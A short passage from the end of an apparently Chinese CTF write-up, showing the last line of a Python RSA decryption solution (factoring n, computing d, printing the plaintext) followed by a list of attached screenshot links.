inverse(e,(p**2-p)*(q-1))print(long_to_bytes(pow(c,d,n)))#分解n 就完事了
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/3-1661739701.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/5-1661739702.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/3-1661739704.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/7-1661739706.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/1-1661739707.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/10-1661739708.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/2-1661739710.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/4-1661739710.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/4-1661739712.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/2-1661739713.png)